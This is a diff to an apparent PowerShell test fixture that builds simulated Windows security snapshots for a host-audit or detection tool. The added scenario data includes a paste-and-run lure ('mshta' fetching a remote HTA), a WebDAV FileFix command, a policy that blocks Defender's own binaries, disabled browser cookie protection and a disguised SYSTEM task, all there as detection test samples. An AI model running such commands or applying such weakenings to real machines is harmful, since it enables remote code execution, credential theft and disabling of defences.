@@ -177,18 +177,21 @@ $s = [ordered]@{
     defender             = [ordered]@{ present = $true; amRunningMode = 'Normal'; amServiceEnabled = $true; antivirusEnabled = $true; realTimeProtectionEnabled = $true; behaviorMonitorEnabled = $true; ioavProtectionEnabled = $true; isTamperProtected = $true; signatureUpdatedUtc = '2026-09-30T22:00:00Z'; exclusionsReadable = $true; exclusionPaths = @(); exclusionExtensions = @(); exclusionProcesses = @(); asrExclusions = @(); asrRuleExclusions = @(); asrRules = $allAsr; puaProtection = 1; networkProtection = 1; controlledFolderAccess = 1; mapsReporting = 2; disableBlockAtFirstSeen = $false; disableScriptScanning = $false
         disableArchiveScanning = $false; disableScanningNetworkFiles = $false; threatDefaultActions = [ordered]@{ severe = 0; high = 0; moderate = 0; low = 0 }; threatIdAllowCount = 0; bruteForceProtection = 1; remoteEncryptionProtection = 1 }
     bitlocker            = [ordered]@{ featureInstalled = $true; volumes = @([ordered]@{ mountPoint = 'C:'; volumeType = 'OperatingSystem'; protectionStatus = 'On'; volumeStatus = 'FullyEncrypted'; encryptionMethod = 'XtsAes256'; keyProtectors = @('Tpm', 'RecoveryPassword') }) }
-    boot                 = [ordered]@{ secureBootEnabled = $true; firmware = 'UEFI' }
+    # Secure Boot on, and the recovery environment turned off on a server nobody recovers by hand.
+    boot                 = [ordered]@{ secureBootEnabled = $true; firmware = 'UEFI'
+        winRe = [ordered]@{ configured = $true; enabled = $false; installState = 1; staged = $false; imagePath = $null; imageModifiedUtc = $null; imageReadable = $false } }
     credentialProtection = [ordered]@{ runAsPPL = 2; lsaCfgFlags = 1; credentialGuardRunning = $true; hvciRunning = $true; vbsStatus = 2; wdigestUseLogonCredential = 0; cachedLogonsCount = '1'; lmCompatibilityLevel = 5; noLmHash = 1; restrictAnonymous = 1; restrictAnonymousSam = 1 }
     network              = [ordered]@{
         smb1ServerEnabled = $false; smbServerSigningRequired = $true; smbClientSigningRequired = $true; smbServerEncryptData = $true; llmnrPolicyEnableMulticast = 0; mdnsPolicyEnable = 0; mdnsServiceEnable = $null
         netbios = @([ordered]@{ adapter = 'vmxnet3 Ethernet Adapter'; tcpipNetbiosOptions = 2 })
         firewallProfiles = @('Domain', 'Private', 'Public' | ForEach-Object { [ordered]@{ name = $_; enabled = $true; defaultInboundAction = 'Block'; logBlocked = 'True' } })
         listening = @([ordered]@{ protocol = 'tcp'; address = '0.0.0.0'; port = 445; process = 'System' }, [ordered]@{ protocol = 'tcp'; address = '0.0.0.0'; port = 443; process = 'w3wp' }, [ordered]@{ protocol = 'tcp'; address = '127.0.0.1'; port = 6379; process = 'redis-server' })
+        portProxy = @()
     }
     remoteAccess         = [ordered]@{ rdpEnabled = $true; rdpNlaRequired = $true }
     localAccounts        = [ordered]@{
         users = @(
-            [ordered]@{ name = 'LocalAdm'; sid = "$machineSid-500"; enabled = $true; passwordRequired = $true; passwordExpires = $false; lastLogonUtc = $null; passwordLastSetUtc = '2026-09-25T00:00:00Z' },
+            [ordered]@{ name = 'LocalAdm'; sid = "$machineSid-500"; enabled = $true; passwordRequired = $true; passwordExpires = $false; lastLogonUtc = '2026-09-28T07:30:00Z'; passwordLastSetUtc = '2026-09-25T00:00:00Z' },
             [ordered]@{ name = 'Guest'; sid = "$machineSid-501"; enabled = $false; passwordRequired = $false; passwordExpires = $false; lastLogonUtc = $null; passwordLastSetUtc = $null })
         administrators = @([ordered]@{ path = "$name/LocalAdm"; sid = "$machineSid-500"; class = 'User' }, [ordered]@{ path = 'CORP/Domain Admins'; sid = "$domainSid-512"; class = 'Group' }, [ordered]@{ path = 'CORP/Server Admins'; sid = "$domainSid-1105"; class = 'Group' })
         administratorsReadable = $true
@@ -242,6 +245,11 @@ $s = [ordered]@{
         officeInstalled = $true
         officeUserPolicy = @((OfficeProfile 1 3 2 2))
         kerberosEncryptionTypes = 2147483640; wefSubscriptionManager = $true
+        # Updates from a WSUS server over TLS, the browsers' own session protection left alone, and
+        # one App Control policy that says nothing about the security agent.
+        windowsUpdateSource = [ordered]@{ useWuServer = 1; server = 'https://wsus.corp.example:8531'; serverScheme = 'https'; statusServer = 'https://wsus.corp.example:8531'; proxyBehavior = $null; trustedPublisher = 1 }
+        browserSecurity = @()
+        ciPolicies = @([ordered]@{ file = '{A6368F33-1FA4-4F12-B3F4-6B5B1F6E7A11}.cip'; length = 54320; modifiedUtc = '2026-02-01T08:00:00Z'; fileNames = @('setup.exe', 'contoso-erp.exe', 'msbuild.exe') })
         # Exploit protection at the Windows defaults, the newer VBS protections and Enhanced Phishing
         # Protection on, NTLM audited, signed AMSI providers only, Administrator protection, no standby
         # with BitLocker, and the optional protections Windows leaves off.
@@ -312,6 +320,11 @@ $s = [ordered]@{
         printProcessors = @([ordered]@{ environment = 'Windows x64'; name = 'winprint'; driver = 'winprint.dll'; exists = $true; signer = 'Microsoft Windows'; status = 'Valid' })
         dotnetProfiler = $null; aeDebug = @(); serviceHooks = @(); hiddenServices = @(); hiddenTasks = @(); logonScripts = @(); psProfiles = @()
         officeTestMachine = @(); officeProfiles = @(); userHivesRead = 1
+        # What the user typed in the Run dialog: everyday commands, nothing fetched or decoded. The
+        # one trusted location is Office's own template folder.
+        runDialog = @([ordered]@{ user = 'jsmith'; source = 'Run dialog'; entry = 'a'; command = 'cmd' },
+            [ordered]@{ user = 'jsmith'; source = 'Explorer address bar'; entry = 'url1'; command = 'C:\Program Files' })
+        officeTrustedLocations = @([ordered]@{ user = 'jsmith'; app = 'Word'; version = '16.0'; location = 'Location0'; path = 'C:\Users\jsmith\AppData\Roaming\Microsoft\Templates'; allowSubfolders = $false; policy = $false })
         ssh = [ordered]@{ installed = $false; adminKeys = $null; userKeys = @() }; bitsJobs = @(); bitsJobCount = 2
         accessibility = @(foreach ($tool in @(@('sethc.exe', 'sethc.exe'), @('utilman.exe', 'utilman2.exe'), @('osk.exe', 'osk.exe'), @('narrator.exe', 'SR.exe'), @('magnify.exe', 'ScreenMagnifier.exe'), @('displayswitch.exe', 'DisplaySwitch'), @('atbroker.exe', 'ATBroker.exe'))) {
                 [ordered]@{ name = $tool[0]; originalName = "$($tool[1]).mui"; internalName = $tool[1]; signer = 'Microsoft Windows'; status = 'Valid' } })
@@ -381,6 +394,11 @@ switch ($Scenario) {
         # the default collection date.
         $s.host.os = [ordered]@{ caption = 'Microsoft Windows 11 Enterprise'; version = '10.0.22631'; build = 22631; ubr = 5909; displayVersion = '23H2'; editionId = 'Enterprise'; productType = 1; architecture = '64-bit'; installDateUtc = '2024-03-01T09:00:00Z'; lastBootUtc = '2026-09-29T07:00:00Z' }
         $s.credentialProtection.cachedLogonsCount = '4'
+        # Credential Guard turned on without the UEFI lock: one registry write undoes it.
+        $s.credentialProtection.lsaCfgFlags = 2
+        # The recovery environment is on, on a disk the TPM unlocks by itself, with an image that was
+        # never serviced since the laptop was built.
+        $s.boot.winRe = [ordered]@{ configured = $true; enabled = $true; installState = 1; staged = $false; imagePath = 'C:\Recovery\WindowsRE\Winre.wim'; imageModifiedUtc = '2024-03-01T09:00:00Z'; imageReadable = $true }
         # Enhanced Phishing Protection on without its password warnings; the laptop sleeps in standby
         # on battery and the logon screen never locks the machine out.
         $s.hardening.phishingProtection = [ordered]@{ captureThreatWindow = 1; notifyMalicious = 1; notifyPasswordReuse = $null; notifyUnsafeApp = 0; serviceEnabled = 1 }
@@ -428,6 +446,31 @@ switch ($Scenario) {
             [ordered]@{ protocol = 'tcp'; address = '0.0.0.0'; port = 5985; process = 'System' }, [ordered]@{ protocol = 'tcp'; address = '127.0.0.1'; port = 3306; process = 'mysqld' },
             [ordered]@{ protocol = 'udp'; address = '0.0.0.0'; port = 161; process = 'snmp' })
         $s.remoteAccess = [ordered]@{ rdpEnabled = $true; rdpNlaRequired = $false }
+        # Somebody left a port forwarding rule behind: RDP from anywhere to a host in the server
+        # segment, and a local relay for a development tool.
+        $s.network.portProxy = @(
+            [ordered]@{ family = 'v4tov4'; protocol = 'tcp'; listen = '0.0.0.0/13389'; connect = '10.20.0.15/3389' },
+            [ordered]@{ family = 'v4tov4'; protocol = 'tcp'; listen = '192.168.1.40/8080'; connect = '127.0.0.1/8081' })
+        # The Run dialog holds a paste-and-run lure (mshta fetching an HTA) and a FileFix attempt in
+        # the address bar; the third entry is an ordinary command that must stay quiet.
+        $s.loadPoints.runDialog = @(
+            [ordered]@{ user = 'jsmith'; source = 'Run dialog'; entry = 'a'; command = 'mshta https://cdn.verify-human.example/check.hta' },
+            [ordered]@{ user = 'jsmith'; source = 'Explorer address bar'; entry = 'url1'; command = 'net use Z: \\files.example@SSL\DavWWWRoot\share' },
+            [ordered]@{ user = 'jsmith'; source = 'Run dialog'; entry = 'b'; command = 'ncpa.cpl' })
+        # Trusted locations added by hand: a share anybody can write to, and the user's Downloads.
+        $s.loadPoints.officeTrustedLocations = @(
+            [ordered]@{ user = 'jsmith'; app = 'Word'; version = '16.0'; location = 'Location5'; path = '\\files.example\templates'; allowSubfolders = $true; policy = $false },
+            [ordered]@{ user = 'jsmith'; app = 'Excel'; version = '16.0'; location = 'Location6'; path = 'C:\Users\jsmith\Downloads'; allowSubfolders = $false; policy = $false })
+        # Chrome told not to protect its cookie store, Edge left open to its debugging port.
+        $s.hardening.browserSecurity = @(
+            [ordered]@{ browser = 'Chrome'; appBoundEncryption = 0; remoteDebuggingAllowed = $null },
+            [ordered]@{ browser = 'Edge'; appBoundEncryption = $null; remoteDebuggingAllowed = 1 })
+        # Updates taken from a WSUS server over http, with the user's proxy allowed in front of them.
+        $s.hardening.windowsUpdateSource = [ordered]@{ useWuServer = 1; server = 'http://wsus.corp.example:8530'; serverScheme = 'http'; statusServer = 'http://wsus.corp.example:8530'; proxyBehavior = 1; trustedPublisher = 1 }
+        # An App Control policy written three days before the snapshot that names Defender's own binaries.
+        $s.hardening.ciPolicies = @([ordered]@{ file = '{B7E4A9C2-0D31-4E57-9A6E-2C1F8B4D7E33}.cip'; length = 12288; modifiedUtc = '2026-09-28T23:41:00Z'; fileNames = @('msmpeng.exe', 'mpcmdrun.exe', 'senseir.exe', 'contoso-erp.exe') })
+        # The antimalware service is not running, although Defender is still the registered antivirus.
+        $s.defender.amServiceEnabled = $false
         $s.localAccounts.users = @(
             [ordered]@{ name = 'Administrator'; sid = "$machineSid-500"; enabled = $true; passwordRequired = $true; passwordExpires = $false; lastLogonUtc = '2025-01-10T09:00:00Z'; passwordLastSetUtc = '2020-03-02T09:00:00Z' },
             [ordered]@{ name = 'Guest'; sid = "$machineSid-501"; enabled = $true; passwordRequired = $false; passwordExpires = $false; lastLogonUtc = $null; passwordLastSetUtc = $null },
@@ -553,6 +596,9 @@ switch ($Scenario) {
                 actions = @([ordered]@{ execute = 'C:\Users\Public\sync.exe'; arguments = ''; executable = 'C:\Users\Public\sync.exe'; writableBy = @((W 'file' 'S-1-1-0' 'FullControl')) }) })
         $s.scheduledTasks += [ordered]@{ path = '\Microsoft\Windows\UpdateOrchestrator\'; name = 'Schedule Scan'; state = 'Ready'; userId = 'SYSTEM'; groupId = ''; runLevel = 'Highest'; author = 'Microsoft'
             actions = @([ordered]@{ execute = 'C:\Windows\system32\UsoClient.exe'; arguments = 'StartScan'; executable = 'C:\Windows\system32\UsoClient.exe'; writableBy = @() }) }
+        # A task parked among Windows' own, created by a user account, running from ProgramData.
+        $s.scheduledTasks += [ordered]@{ path = '\Microsoft\Windows\UpdateOrchestrator\'; name = 'ReportingHealth'; state = 'Ready'; userId = 'SYSTEM'; groupId = ''; logonType = 'ServiceAccount'; runLevel = 'Highest'; author = 'CORP\jsmith'
+            actions = @([ordered]@{ execute = 'C:\ProgramData\Contoso\upd.exe'; arguments = '-q'; executable = 'C:\ProgramData\Contoso\upd.exe'; writableBy = @() }) }
         $s.autoruns = @(
             [ordered]@{ location = 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'; name = 'TrayHelper'; command = 'C:\ProgramData\TrayHelper\tray.exe'; executable = 'C:\ProgramData\TrayHelper\tray.exe'; writableBy = @((W 'file' 'S-1-5-32-545')) })
         # PATH: a folder an uninstalled Python left behind, which Authenticated Users may create in C:\
